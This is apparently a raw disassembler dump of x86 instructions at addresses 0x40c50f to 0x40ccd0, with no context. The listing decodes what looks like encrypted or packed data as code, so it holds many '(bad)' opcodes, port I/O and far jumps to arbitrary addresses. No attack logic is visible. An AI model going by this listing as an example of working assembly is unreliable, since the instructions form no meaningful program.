  40c50f:	mov    eax,0x1bbd91cd
  40c514:	lahf   
  40c515:	repnz (bad) 
  40c517:	das    
  40c518:	loop   0x40c54b
  40c51a:	out    dx,eax
  40c51b:	mov    ds:0x62d2f109,al
  40c520:	in     eax,dx
  40c521:	sub    DWORD PTR [ebx+0x22943f78],edi
  40c527:	xchg   esi,eax
  40c528:	call   0xe906:0xf0a9867a
  40c52f:	and    al,0x67
  40c531:	in     eax,dx
  40c532:	iret   
  40c533:	sub    esp,eax
  40c535:	push   0x44
  40c537:	or     al,0x15
  40c539:	mov    ah,0xa0
  40c53b:	jne    0x40c514
  40c53d:	mov    DWORD PTR [edx],edx
  40c53f:	mov    ?,eax
  40c541:	je     0x40c4ca
  40c543:	mov    bh,0x80
  40c545:	mov    edx,DWORD PTR [edx+0x3d447caa]
  40c54b:	cs pop edi
  40c54d:	jge    0x40c4d6
  40c54f:	ss pop esi
  40c551:	in     eax,dx
  40c552:	cmp    cl,BYTE PTR [esi+0x26]
  40c555:	xor    al,0x80
  40c557:	pop    es
  40c558:	ret    0x5dee
  40c55b:	(bad)  
  40c55c:	pop    ebp
  40c55d:	jno    0x40c55a
  40c55f:	mov    ah,0x2c
  40c561:	inc    ebx
  40c562:	les    eax,FWORD PTR [eax]
  40c564:	xchg   edi,eax
  40c565:	pop    edx
  40c566:	mov    bl,0x28
  40c568:	sub    bl,BYTE PTR [edi-0x51]
  40c56b:	ror    DWORD PTR [eax],0xcc
  40c56e:	add    ebx,esp
  40c570:	clc    
  40c571:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c572:	retf   0x3240
  40c575:	out    dx,eax
  40c576:	add    cl,ch
  40c578:	and    eax,0xd2b805b2
  40c57d:	fs (bad) 
  40c57f:	xchg   ecx,eax
  40c580:	or     DWORD PTR [eax+0x170e920d],ebx
  40c586:	mov    bl,0xc1
  40c588:	fptan  
  40c58a:	mov    BYTE PTR [eax],al
  40c58c:	in     eax,dx
  40c58d:	jle    0x40c584
  40c58f:	ja     0x40c5a3
  40c591:	add    DWORD PTR [edi],eax
  40c593:	je     0x40c5a9
  40c595:	test   al,0x65
  40c597:	adc    ecx,DWORD PTR [edi-0x9]
  40c59a:	out    0x43,al
  40c59c:	inc    eax
  40c59d:	push   eax
  40c59e:	pop    edi
  40c59f:	fist   WORD PTR [ebp+0x2fd87cf0]
  40c5a5:	lock adc DWORD PTR [eax+0x35ad029a],ebp
  40c5ac:	or     al,al
  40c5ae:	je     0x40c57f
  40c5b0:	es mov ah,0x36
  40c5b3:	sub    bl,ah
  40c5b5:	in     al,dx
  40c5b6:	push   ds
  40c5b7:	push   ss
  40c5b8:	push   esi
  40c5b9:	lods   eax,DWORD PTR ds:[esi]
  40c5ba:	dec    ebp
  40c5bb:	loopne 0x40c5fb
  40c5bd:	scas   al,BYTE PTR es:[edi]
  40c5be:	js     0x40c569
  40c5c0:	clc    
  40c5c1:	jnp    0x40c55c
  40c5c3:	(bad)  
  40c5c4:	shl    DWORD PTR [ebx],cl
  40c5c6:	mov    edi,0x3e09f7e7
  40c5cb:	js     0x40c5e7
  40c5cd:	cli    
  40c5ce:	push   ds
  40c5cf:	div    BYTE PTR [eax-0x10]
  40c5d2:	push   ss
  40c5d3:	into   
  40c5d4:	mov    ah,0xd6
  40c5d6:	mov    ebx,0xfadc7227
  40c5db:	and    eax,0x3a42de70
  40c5e0:	inc    edi
  40c5e1:	es addr16 daa 
  40c5e4:	dec    eax
  40c5e5:	mov    edi,0xf175de90
  40c5ea:	rcl    BYTE PTR [edx+0x5cc82cc],cl
  40c5f0:	mov    BYTE PTR [ecx+0x28],dl
  40c5f3:	cmp    DWORD PTR ds:0xb45c4624,ecx
  40c5f9:	push   ds
  40c5fa:	mov    edi,0x6b331ebe
  40c5ff:	das    
  40c600:	ja     0x40c5fc
  40c602:	int    0x5f
  40c604:	je     0x40c5f7
  40c606:	loopne 0x40c63e
  40c608:	repnz std 
  40c60a:	xor    dh,ah
  40c60c:	imul   esi,DWORD PTR [ebx-0x1bf63726],0x60
  40c613:	jae    0x40c666
  40c615:	(bad)  
  40c616:	mov    dl,0xbf
  40c618:	xchg   ebp,eax
  40c619:	xor    DWORD PTR [edi-0x6f11c94a],esi
  40c61f:	inc    edx
  40c620:	fisub  WORD PTR [esi]
  40c622:	xlat   BYTE PTR ds:[ebx]
  40c623:	and    al,0xb9
  40c625:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c626:	pop    es
  40c627:	inc    edx
  40c628:	idiv   DWORD PTR [edi-0x71]
  40c62b:	push   ebp
  40c62c:	fadd   DWORD PTR [ecx-0x23]
  40c62f:	xchg   BYTE PTR [esi],cl
  40c631:	icebp  
  40c632:	sbb    ah,bh
  40c634:	scas   al,BYTE PTR es:[edi]
  40c635:	dec    edx
  40c636:	test   BYTE PTR [esi],cl
  40c638:	fdivr  QWORD PTR [edi+0x7a154626]
  40c63e:	dec    edx
  40c63f:	mov    ah,0xea
  40c641:	xor    DWORD PTR [ebx-0x66422bff],esi
  40c647:	out    dx,eax
  40c648:	or     esi,DWORD PTR [esi]
  40c64a:	in     eax,0xe0
  40c64c:	cmp    cl,BYTE PTR ds:0x5087d25f
  40c652:	and    al,0x29
  40c654:	lods   al,BYTE PTR ds:[esi]
  40c655:	test   DWORD PTR [edx],edi
  40c657:	cmp    eax,0x78d8161d
  40c65c:	or     eax,edi
  40c65e:	fadd   QWORD PTR [edi]
  40c660:	mov    ecx,eax
  40c662:	fldcw  WORD PTR [ebx-0x32db3774]
  40c668:	fidiv  DWORD PTR [ecx+0x25]
  40c66b:	jo     0x40c6b1
  40c66d:	pop    ss
  40c66e:	repnz and eax,0x3c0e6e08
  40c674:	in     ax,dx
  40c676:	clc    
  40c677:	jns    0x40c68e
  40c679:	lock dec edx
  40c67b:	adc    BYTE PTR [esp+ebp*1-0x48],ah
  40c67f:	add    BYTE PTR [edi-0x3d],dl
  40c682:	enter  0xf0a7,0x64
  40c686:	xchg   DWORD PTR [ecx+0x5fc1a67a],ecx
  40c68c:	jmp    0x9f69d8a2
  40c691:	mov    ebp,0x5e093a74
  40c696:	pop    esi
  40c697:	xchg   ebx,eax
  40c698:	and    al,BYTE PTR [ecx-0x8752976]
  40c69e:	aam    0x92
  40c6a0:	pusha  
  40c6a1:	xor    DWORD PTR [eax],edi
  40c6a3:	adc    DWORD PTR [edi-0x2b],esp
  40c6a6:	mov    ds:0xe71a064b,eax
  40c6ab:	sbb    BYTE PTR [ecx+0xb],cl
  40c6ae:	adc    eax,0x6812d785
  40c6b3:	sbb    eax,0x9592f119
  40c6b8:	or     ch,BYTE PTR [ebx-0x65dd9ed6]
  40c6be:	mov    ?,WORD PTR [ebx-0x189bba0c]
  40c6c4:	push   eax
  40c6c5:	push   eax
  40c6c6:	xchg   DWORD PTR [ebp+0x48764ab3],ebp
  40c6cc:	cmp    DWORD PTR [ecx+ebx*4+0x29],ecx
  40c6d0:	lods   eax,DWORD PTR ds:[esi]
  40c6d1:	retf   0xcaa7
  40c6d4:	neg    DWORD PTR [ebx+0x59]
  40c6d7:	adc    eax,0x9f707178
  40c6dc:	cli    
  40c6dd:	icebp  
  40c6de:	fs aad 0x23
  40c6e1:	addr16 xchg ebx,eax
  40c6e3:	add    DWORD PTR [ecx],ebp
  40c6e5:	sub    eax,0xc87b8984
  40c6ea:	pop    edi
  40c6eb:	js     0x40c735
  40c6ed:	retf   0x28e8
  40c6f0:	mov    dl,0x77
  40c6f2:	sub    edx,DWORD PTR [ecx+0x29598689]
  40c6f8:	es pop eax
  40c6fa:	or     eax,0x25500845
  40c6ff:	and    BYTE PTR [edi+0x55],al
  40c702:	mov    dh,0x2f
  40c704:	sti    
  40c705:	mul    DWORD PTR [edx+0xafec72a]
  40c70b:	repnz mov DWORD PTR [edi-0x2a44c206],ecx
  40c712:	mov    esp,0xbbeb2791
  40c717:	sbb    ecx,ebp
  40c719:	cmp    BYTE PTR [edi+0x68f143da],al
  40c71f:	mov    edi,0x8e4345a9
  40c724:	sub    eax,0x1fb613ca
  40c729:	xchg   ebx,esi
  40c72b:	inc    edi
  40c72c:	jmp    0xfe69aa78
  40c731:	clc    
  40c732:	ret    
  40c733:	mov    ds:0x614349a3,al
  40c738:	std    
  40c739:	jno    0x40c70c
  40c73b:	push   ss
  40c73c:	xor    al,0x5b
  40c73e:	jb     0x40c73f
  40c740:	jp     0x40c6d8
  40c742:	cmc    
  40c743:	lock sbb eax,0x8b2b1138
  40c749:	sub    BYTE PTR [ecx+0x71e79ae],0xff
  40c750:	ja     0x40c74e
  40c752:	call   0x2d24c580
  40c757:	mov    dl,0x8
  40c759:	mov    al,ds:0x12e0909c
  40c75e:	jbe    0x40c783
  40c760:	pop    ecx
  40c761:	icebp  
  40c762:	or     BYTE PTR [esi],ch
  40c764:	pop    esp
  40c765:	(bad)  
  40c766:	pop    edx
  40c767:	or     eax,0xe334ba02
  40c76c:	ss in  al,0x87
  40c76f:	test   DWORD PTR [ebp-0x1],esp
  40c772:	mov    esp,0x3d8171cd
  40c777:	sub    BYTE PTR [ebx-0x6f1e45c8],dh
  40c77d:	or     dh,BYTE PTR [ebp+0x6d639dd3]
  40c783:	sub    BYTE PTR [eax-0x60437c9],ah
  40c789:	adc    eax,0x6743159a
  40c78e:	jo     0x40c7b9
  40c790:	(bad)  
  40c792:	dec    esi
  40c793:	pop    ebx
  40c794:	mov    ebx,0x235787bf
  40c799:	fidivr DWORD PTR [ebp+0x79]
  40c79c:	dec    ecx
  40c79d:	ss inc esi
  40c79f:	sub    ecx,edi
  40c7a1:	adc    al,0xa2
  40c7a3:	xchg   ebp,eax
  40c7a4:	or     DWORD PTR [esi],esi
  40c7a6:	add    esp,edi
  40c7a8:	pop    edx
  40c7a9:	nop
  40c7aa:	xchg   edi,eax
  40c7ab:	stc    
  40c7ac:	std    
  40c7ad:	xor    BYTE PTR [ecx+0x5e],dh
  40c7b0:	and    esp,0xfffffffe
  40c7b3:	sub    DWORD PTR [edx],eax
  40c7b5:	call   0x759:0xfe08d5b1
  40c7bc:	xchg   ebp,eax
  40c7bd:	cmc    
  40c7be:	adc    cl,ch
  40c7c0:	ins    BYTE PTR es:[edi],dx
  40c7c1:	lock pop esp
  40c7c3:	mov    ecx,0x6ad39177
  40c7c8:	jmp    0x5fd8:0x804ac36
  40c7cf:	inc    esi
  40c7d0:	sub    al,0x55
  40c7d2:	sbb    al,0xfd
  40c7d4:	xchg   esp,eax
  40c7d5:	icebp  
  40c7d6:	and    BYTE PTR [eax+ebx*1-0x5d],al
  40c7da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7db:	fwait
  40c7dc:	lods   eax,DWORD PTR ds:[esi]
  40c7dd:	sbb    bl,BYTE PTR [esi-0x67fbd4a8]
  40c7e3:	dec    ecx
  40c7e4:	jbe    0x40c771
  40c7e6:	out    dx,eax
  40c7e7:	test   eax,0xbc90f2c0
  40c7ec:	sbb    eax,0x5b8a8e2a
  40c7f1:	adc    ch,cl
  40c7f3:	leave  
  40c7f4:	(bad)  
  40c7f5:	mov    dh,0x7f
  40c7f7:	loopne 0x40c82d
  40c7f9:	jae    0x40c781
  40c7fb:	cmp    DWORD PTR [edx],esi
  40c7fd:	xchg   esi,eax
  40c7fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7ff:	pop    edi
  40c800:	stc    
  40c801:	(bad)  
  40c802:	retf   
  40c803:	push   esi
  40c804:	xchg   edx,eax
  40c805:	add    DWORD PTR [edi+0x52920d18],0x867bba88
  40c80f:	cmp    eax,0xbb04a1ae
  40c814:	sbb    eax,0xf28a5bd
  40c819:	add    DWORD PTR [edi+0x3689f7e1],ebx
  40c81f:	push   cs
  40c820:	sbb    ah,bl
  40c822:	mov    bl,BYTE PTR [edx+0x30]
  40c825:	cld    
  40c826:	mov    edx,0x537d2898
  40c82b:	fmul   DWORD PTR [ecx]
  40c82d:	pusha  
  40c82e:	js     0x11df7944
  40c834:	mov    esp,0xd88cdeff
  40c839:	ss mov al,0x14
  40c83c:	in     eax,0x71
  40c83e:	shr    cl,0x8
  40c841:	push   es
  40c842:	mov    ss,WORD PTR [edi+0x6904f5d9]
  40c848:	repz lock test BYTE PTR [ebx],dl
  40c84c:	bound  esi,QWORD PTR [ecx]
  40c84e:	pop    ds
  40c84f:	jge    0x40c8cf
  40c851:	ret    
  40c852:	aaa    
  40c853:	inc    ebp
  40c854:	outs   dx,DWORD PTR ds:[esi]
  40c855:	mov    al,0x87
  40c857:	xchg   ebp,eax
  40c858:	push   0xcbe12e71
  40c85d:	hlt    
  40c85e:	leave  
  40c85f:	sub    edx,esp
  40c861:	inc    eax
  40c862:	fbld   TBYTE PTR [edi+eax*1]
  40c865:	rcr    BYTE PTR [edi-0x5d],1
  40c868:	add    eax,0xab9c9918
  40c86d:	mov    ebx,0x39a02bf1
  40c872:	sub    al,0x70
  40c874:	mov    bh,0x52
  40c876:	(bad)  
  40c877:	sub    BYTE PTR [esi-0x7c],dl
  40c87a:	mov    al,0x82
  40c87c:	or     BYTE PTR [ecx+eiz*8-0x3],ch
  40c880:	ret    
  40c881:	dec    edx
  40c882:	jle    0x40c895
  40c884:	dec    edx
  40c885:	add    eax,0x3751e18b
  40c88a:	xchg   edi,eax
  40c88b:	sub    DWORD PTR [esi+0x808e400],esi
  40c891:	mov    al,0x82
  40c893:	add    al,dl
  40c895:	mov    ch,0x35
  40c897:	xor    ebp,DWORD PTR [edi-0xf]
  40c89a:	cmp    al,0xcc
  40c89c:	fld    TBYTE PTR [ebx+ebp*1-0x5c0a6703]
  40c8a3:	add    ch,BYTE PTR [esi-0x21e679fe]
  40c8a9:	mov    esi,0xc53a776
  40c8ae:	or     al,0x2a
  40c8b0:	test   DWORD PTR [edi-0x63b06b00],0x3d69b98e
  40c8ba:	xchg   ebx,esp
  40c8bc:	push   ebp
  40c8bd:	lods   al,BYTE PTR ds:[esi]
  40c8be:	inc    ebx
  40c8bf:	aas    
  40c8c0:	sbb    edi,DWORD PTR [ebp+0x69083f57]
  40c8c6:	dec    eax
  40c8c7:	lahf   
  40c8c8:	xchg   edx,eax
  40c8c9:	add    dh,BYTE PTR [ecx-0x2e]
  40c8cc:	gs xchg edx,eax
  40c8ce:	mov    edx,0x72f37ad
  40c8d3:	(bad)  
  40c8d4:	int    0xf0
  40c8d6:	pop    esi
  40c8d7:	sub    al,0xa6
  40c8d9:	push   ebx
  40c8da:	jnp    0x40c8f6
  40c8dc:	jnp    0x40c88a
  40c8de:	in     al,0x54
  40c8e0:	das    
  40c8e1:	fiadd  DWORD PTR [edi-0x39ad55d]
  40c8e7:	ins    BYTE PTR es:[edi],dx
  40c8e8:	daa    
  40c8e9:	xor    BYTE PTR [ebx-0x362760d7],bl
  40c8ef:	imul   edi,esi,0xb6ca3c9e
  40c8f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8f6:	adc    BYTE PTR [ecx-0x4868e276],0xf7
  40c8fd:	out    0xba,al
  40c8ff:	push   ebp
  40c900:	lahf   
  40c901:	add    ebp,DWORD PTR [edx+0x2bf3f7c4]
  40c907:	js     0x40c8be
  40c909:	ss ss (bad) 
  40c90c:	out    dx,eax
  40c90d:	lock cs stc 
  40c910:	mov    dh,0xe
  40c912:	adc    eax,0x43640e6e
  40c917:	sub    DWORD PTR ds:0x93266c2,0x7c
  40c91e:	loope  0x40c902
  40c920:	mov    ds:0xe3431225,eax
  40c925:	nop
  40c926:	mov    ecx,0xc49ef82a
  40c92b:	adc    ch,BYTE PTR [ebx+0x52a83d79]
  40c931:	dec    ebx
  40c932:	xchg   BYTE PTR [edi-0x5b7c66ea],dh
  40c938:	aas    
  40c939:	mov    esi,esi
  40c93b:	adc    DWORD PTR [eax+0x1f],esi
  40c93e:	aad    0x37
  40c940:	and    al,0x28
  40c942:	(bad)  
  40c943:	pop    edi
  40c944:	mul    DWORD PTR ds:0x510237d7
  40c94a:	jp     0xd94ae670
  40c950:	push   0xfffffff1
  40c952:	xchg   esi,eax
  40c953:	fld    TBYTE PTR [edi-0x2d]
  40c956:	jmp    0x509c370c
  40c95b:	in     al,0x6e
  40c95d:	pop    esi
  40c95e:	xchg   BYTE PTR [ebp-0x3126affd],bl
  40c964:	data16 lock repnz shl ch,0x80
  40c96a:	sub    bl,BYTE PTR [eax]
  40c96c:	rol    BYTE PTR [esi-0x3],cl
  40c96f:	leave  
  40c970:	retf   
  40c971:	push   ebx
  40c972:	mov    ebx,0x79d9eb1
  40c977:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c978:	es lock push eax
  40c97b:	icebp  
  40c97c:	jp     0x40c9de
  40c97e:	mov    ds:0xfa819a77,al
  40c983:	or     DWORD PTR [edx+ebx*2],ecx
  40c986:	xchg   BYTE PTR [ecx-0x42],bh
  40c989:	xor    dh,dl
  40c98b:	test   eax,0x29ed4675
  40c990:	pop    ecx
  40c991:	jmp    0x40c951
  40c993:	inc    edi
  40c994:	inc    ebx
  40c995:	sbb    BYTE PTR [ebx],0x1d
  40c998:	add    BYTE PTR [edi+eax*2-0x3e8b0853],dl
  40c99f:	imul   esi,DWORD PTR [esi+0x6eb224f1],0xffffffec
  40c9a6:	repz sub BYTE PTR cs:[ebx],bh
  40c9aa:	fdiv   st,st(5)
  40c9ac:	fisttp DWORD PTR [edx]
  40c9ae:	xchg   DWORD PTR [edi],edi
  40c9b0:	mov    ah,dl
  40c9b2:	inc    ebp
  40c9b3:	inc    esp
  40c9b4:	iret   
  40c9b5:	push   ecx
  40c9b6:	sub    al,0x2b
  40c9b8:	je     0x40c97f
  40c9ba:	fsub   DWORD PTR gs:[ebp-0x7846e4f4]
  40c9c1:	xchg   ebp,eax
  40c9c2:	xchg   BYTE PTR [edi+0x19a99684],al
  40c9c8:	test   DWORD PTR [eax-0x7e3dd7f4],ecx
  40c9ce:	jecxz  0x40c98a
  40c9d0:	div    BYTE PTR [esi]
  40c9d2:	add    dh,BYTE PTR [eax-0x22]
  40c9d5:	pop    eax
  40c9d6:	xchg   ecx,esp
  40c9d8:	xchg   esp,eax
  40c9d9:	inc    esi
  40c9da:	(bad)  
  40c9db:	jnp    0x40ca14
  40c9dd:	sub    DWORD PTR [ebx-0x120c89da],esi
  40c9e3:	lahf   
  40c9e4:	adc    DWORD PTR [eax],esp
  40c9e6:	fldcw  WORD PTR [edi+0x9]
  40c9e9:	inc    eax
  40c9ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9eb:	loop   0x40ca52
  40c9ed:	mov    esi,esi
  40c9ef:	xchg   edx,eax
  40c9f0:	gs icebp 
  40c9f2:	mov    ah,0x70
  40c9f4:	push   ss
  40c9f5:	inc    ecx
  40c9f6:	in     al,dx
  40c9f7:	adc    BYTE PTR ds:0xfaad726c,al
  40c9fd:	or     DWORD PTR [edi-0x1cefc471],eax
  40ca03:	hlt    
  40ca04:	jnp    0x40ca3e
  40ca06:	dec    edi
  40ca07:	das    
  40ca08:	mov    eax,ds:0x1283e5e1
  40ca0d:	push   0x8a973187
  40ca12:	(bad)  
  40ca13:	in     eax,dx
  40ca14:	adc    DWORD PTR [edi+0x61a62921],esp
  40ca1a:	or     eax,0x42d20e3d
  40ca1f:	adc    eax,0x31b271c7
  40ca24:	sub    ebp,DWORD PTR [ecx-0x6e]
  40ca27:	fnstcw WORD PTR [ebp+0x6b]
  40ca2a:	sub    BYTE PTR [edi],0x64
  40ca2d:	adc    esi,0x179102f2
  40ca33:	in     al,dx
  40ca34:	push   cs
  40ca35:	inc    eax
  40ca36:	dec    ebx
  40ca37:	les    esp,FWORD PTR [ecx-0x4881a6e0]
  40ca3d:	lods   al,BYTE PTR ds:[esi]
  40ca3e:	sar    BYTE PTR [eax+0x16475b59],cl
  40ca44:	(bad)  
  40ca45:	adc    al,dl
  40ca47:	sub    ecx,ebp
  40ca49:	mov    al,ds:0x294197f0
  40ca4e:	mov    eax,0x720423d
  40ca53:	into   
  40ca54:	ret    0xaf1
  40ca57:	ins    BYTE PTR es:[edi],dx
  40ca58:	es inc ebx
  40ca5a:	mov    edi,0x9621901a
  40ca5f:	aaa    
  40ca60:	and    al,0xe3
  40ca62:	xchg   bh,dl
  40ca64:	or     eax,0xa923e116
  40ca69:	retf   
  40ca6a:	cmp    ch,BYTE PTR [ecx]
  40ca6c:	rcr    DWORD PTR [edi+0x38094419],1
  40ca72:	cmp    eax,0xc3c0b6bf
  40ca77:	gs mov ecx,0x92cdaaf3
  40ca7d:	pcmpgtb mm5,QWORD PTR [edx-0x75ac6eb]
  40ca84:	or     BYTE PTR [eax-0x26],ah
  40ca87:	sbb    edi,esp
  40ca89:	sbb    BYTE PTR [ebp-0x30f950d],bl
  40ca8f:	mov    al,ds:0xb2bca948
  40ca94:	pop    edx
  40ca95:	ret    
  40ca96:	adc    DWORD PTR [edi+0x1986fba2],ebx
  40ca9c:	jmp    0xac3779a6
  40caa1:	mov    gs,WORD PTR [esi]
  40caa3:	sub    eax,edx
  40caa5:	xor    ebp,DWORD PTR [esi-0x27]
  40caa8:	push   cs
  40caa9:	mov    bh,BYTE PTR [esi+0x566054a7]
  40caaf:	aad    0x41
  40cab1:	call   0x58694a6
  40cab6:	sub    DWORD PTR ds:[ebx+0x8db4e00],eax
  40cabd:	inc    esi
  40cabe:	int    0x9c
  40cac0:	jmp    0x40caac
  40cac2:	xchg   ecx,eax
  40cac3:	inc    eax
  40cac4:	shl    ecx,1
  40cac6:	es jbe 0x40cb27
  40cac9:	stos   BYTE PTR es:[edi],al
  40caca:	dec    ebx
  40cacb:	test   al,0xd6
  40cacd:	dec    eax
  40cace:	push   ss
  40cacf:	outs   dx,DWORD PTR ds:[esi]
  40cad0:	xchg   edi,eax
  40cad1:	aam    0x7
  40cad3:	test   al,0xc8
  40cad5:	rep ins BYTE PTR es:[edi],dx
  40cad7:	(bad)  [eax]
  40cad9:	adc    DWORD PTR [esp+edx*8+0x30],esp
  40cadd:	jo     0x40ca87
  40cadf:	mov    BYTE PTR ds:0x7afc2105,bl
  40cae5:	aad    0x85
  40cae7:	rcl    edi,1
  40cae9:	fidivr DWORD PTR [edi+0xef1c89a]
  40caef:	test   al,0xa5
  40caf1:	in     eax,0xcc
  40caf3:	inc    esp
  40caf4:	pop    ebp
  40caf5:	cmc    
  40caf6:	mov    ds:0x87ed0d31,al
  40cafb:	cmp    DWORD PTR [edi-0x60],esp
  40cafe:	jmp    0x40cab2
  40cb00:	lds    esi,FWORD PTR [eax+edi*8+0x4061329]
  40cb07:	add    cl,BYTE PTR [eax]
  40cb09:	inc    esp
  40cb0a:	sub    DWORD PTR [ebx+0x7c],ecx
  40cb0d:	ror    DWORD PTR [ecx-0xa],1
  40cb10:	adc    bh,dh
  40cb12:	add    bl,BYTE PTR [eax+ecx*4]
  40cb15:	inc    eax
  40cb16:	outs   dx,BYTE PTR ds:[esi]
  40cb17:	push   esi
  40cb18:	(bad)  [edi]
  40cb1a:	mov    ds:0xadb60983,eax
  40cb1f:	test   al,0x33
  40cb21:	push   ebp
  40cb22:	and    cl,BYTE PTR [eax-0x66c510e3]
  40cb28:	push   0xb05faf44
  40cb2d:	push   ds
  40cb2e:	inc    edi
  40cb2f:	pop    ecx
  40cb30:	or     BYTE PTR [esi+0x93070b6],bl
  40cb36:	push   ds
  40cb37:	in     eax,dx
  40cb38:	pop    edx
  40cb39:	cmc    
  40cb3a:	repnz cdq 
  40cb3c:	sub    BYTE PTR [ecx-0x75888c02],al
  40cb42:	fs push ss
  40cb44:	imul   DWORD PTR [edi]
  40cb46:	push   esi
  40cb47:	js     0x40cb0c
  40cb49:	outs   dx,BYTE PTR ds:[esi]
  40cb4a:	add    eax,0xb4f0aa2f
  40cb4f:	push   cs
  40cb50:	push   eax
  40cb51:	adc    DWORD PTR [ebx],0x81ea8e9d
  40cb57:	and    al,0x89
  40cb59:	mov    ecx,0x3ddc4385
  40cb5e:	and    BYTE PTR [ebx-0xcf9a76f],ah
  40cb64:	sar    DWORD PTR [eax],0xcc
  40cb67:	sub    DWORD PTR [esp+edi*4+0x23],esi
  40cb6b:	test   DWORD PTR [esi],0x60750a7a
  40cb71:	repnz test eax,0x47e0d3a7
  40cb77:	les    esp,FWORD PTR [ecx+0x54288d64]
  40cb7d:	ss cli 
  40cb7f:	mov    edx,0x4d924ff7
  40cb84:	ja     0x40cb31
  40cb86:	push   0x6b15d343
  40cb8b:	add    al,0x3f
  40cb8d:	scas   eax,DWORD PTR es:[edi]
  40cb8e:	cmp    al,0x35
  40cb90:	into   
  40cb91:	mov    ds:0x15d70983,al
  40cb96:	lods   al,BYTE PTR ds:[esi]
  40cb97:	outs   dx,BYTE PTR ds:[esi]
  40cb98:	xor    ebx,esp
  40cb9a:	jo     0x40cbdc
  40cb9c:	or     ebp,eax
  40cb9e:	xchg   esi,eax
  40cb9f:	loopne 0x40cb6a
  40cba1:	adc    eax,0x27b3813d
  40cba6:	call   0x9cb:0x89e4125b
  40cbad:	inc    eax
  40cbae:	enter  0x2aff,0xe9
  40cbb2:	jbe    0x40cbab
  40cbb4:	in     eax,dx
  40cbb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbb6:	test   BYTE PTR ds:0xf73421dd,ch
  40cbbc:	scas   eax,DWORD PTR es:[edi]
  40cbbd:	fld    TBYTE PTR [esi+edx*2]
  40cbc0:	push   ecx
  40cbc1:	loopne 0x40cc39
  40cbc3:	sub    BYTE PTR [eax],bh
  40cbc5:	cmp    BYTE PTR [edi-0x74],0xf7
  40cbc9:	call   FWORD PTR [edi+0x8fe4746]
  40cbcf:	dec    edi
  40cbd0:	imul   esi,DWORD PTR [eax],0x348bc847
  40cbd6:	aas    
  40cbd7:	push   edx
  40cbd8:	and    esi,DWORD PTR [eax+0x46f1487]
  40cbde:	pop    eax
  40cbdf:	xchg   edx,eax
  40cbe0:	mov    ss,ecx
  40cbe2:	mov    DWORD PTR [ebx],edi
  40cbe4:	mov    al,ds:0x762e48b4
  40cbe9:	push   ss
  40cbea:	push   es
  40cbeb:	loopne 0x40cc3e
  40cbed:	stos   DWORD PTR es:[edi],eax
  40cbee:	cwde   
  40cbef:	sub    DWORD PTR [edx-0x8ac2f35],ecx
  40cbf5:	aad    0x7c
  40cbf7:	cmp    BYTE PTR [ecx-0x2a5c5b9f],bl
  40cbfd:	retf   
  40cbfe:	inc    eax
  40cbff:	sub    ah,BYTE PTR [ecx+esi*2]
  40cc02:	cdq    
  40cc03:	and    BYTE PTR [ecx],cl
  40cc05:	sub    ecx,eax
  40cc07:	ror    DWORD PTR [eax],1
  40cc09:	fcomp  QWORD PTR [edx+0xf6d018a]
  40cc0f:	pop    edx
  40cc10:	push   edx
  40cc11:	lock push ss
  40cc13:	test   al,cl
  40cc15:	dec    esp
  40cc16:	imul   edi,esp,0xaaec5ad2
  40cc1c:	imul   edi,esp,0xffffff86
  40cc1f:	shl    DWORD PTR [edi+0x7f],0xec
  40cc23:	sbb    edx,DWORD PTR [ecx]
  40cc25:	lahf   
  40cc26:	inc    esp
  40cc27:	sub    DWORD PTR [ecx],ebx
  40cc29:	retf   
  40cc2a:	jno    0x40cc7a
  40cc2c:	or     dl,dh
  40cc2e:	(bad)  
  40cc2f:	std    
  40cc30:	sub    al,0x5f
  40cc32:	inc    edx
  40cc33:	add    DWORD PTR [edx+0x10cf02f2],ebx
  40cc39:	scas   eax,DWORD PTR es:[edi]
  40cc3a:	xor    BYTE PTR [esi+0x36a9310f],ch
  40cc40:	xor    edx,edx
  40cc42:	fadd   DWORD PTR [ecx+ecx*4]
  40cc45:	dec    edx
  40cc46:	lahf   
  40cc47:	fwait
  40cc48:	cs call 0x2968:0x5da9fee2
  40cc50:	fild   DWORD PTR [ebx-0x3e0f11fd]
  40cc56:	imul   ecx,eax,0x4c
  40cc59:	pop    edx
  40cc5a:	xchg   DWORD PTR [ebx-0x45a956e7],ecx
  40cc60:	pop    ebp
  40cc61:	test   al,0xe5
  40cc63:	sub    cl,bl
  40cc65:	fild   QWORD PTR [ebx+0x37]
  40cc68:	fwait
  40cc69:	sbb    al,0xf3
  40cc6b:	cdq    
  40cc6c:	or     eax,0x594d8748
  40cc71:	mov    eax,ds:0x28f1105b
  40cc76:	mov    esp,0xc446870e
  40cc7b:	sub    DWORD PTR [esi-0x58964685],edx
  40cc81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc82:	mov    esp,0xbbbe379b
  40cc87:	rcl    BYTE PTR [eax+0x72],cl
  40cc8a:	xchg   edx,esi
  40cc8c:	maskmovq mm1,(bad)
  40cc8d:	test   DWORD PTR [esp+eiz*8-0x34],0x1a6dddfb
  40cc95:	lds    edx,FWORD PTR [esi]
  40cc97:	and    eax,0x8ecf5f99
  40cc9c:	lock addr16 dec ebp
  40cc9f:	mov    DWORD PTR [eax],ecx
  40cca1:	inc    esp
  40cca2:	push   edx
  40cca3:	shr    BYTE PTR [eax],0xd3
  40cca6:	sbb    edx,esi
  40cca8:	repnz out dx,eax
  40ccaa:	mov    WORD PTR [esi],ss
  40ccac:	inc    ebx
  40ccad:	jne    0x40cd17
  40ccaf:	mov    esp,0x3d86fc57
  40ccb4:	mul    DWORD PTR [ebx]
  40ccb6:	test   DWORD PTR [ebx-0x37],eax
  40ccb9:	jno    0x40cce8
  40ccbb:	ret    0xf00f
  40ccbe:	loopne 0x40cc41
  40ccc0:	sahf   
  40ccc1:	mov    bh,0xf1
  40ccc3:	mov    edx,0x53bf4b64
  40ccc8:	out    dx,eax
  40ccc9:	push   cs
  40ccca:	lahf   
  40cccb:	mov    eax,ds:0x6cae80e8
  40ccd0:	or     BYTE PTR [edx-0x33dd1f5a],bl
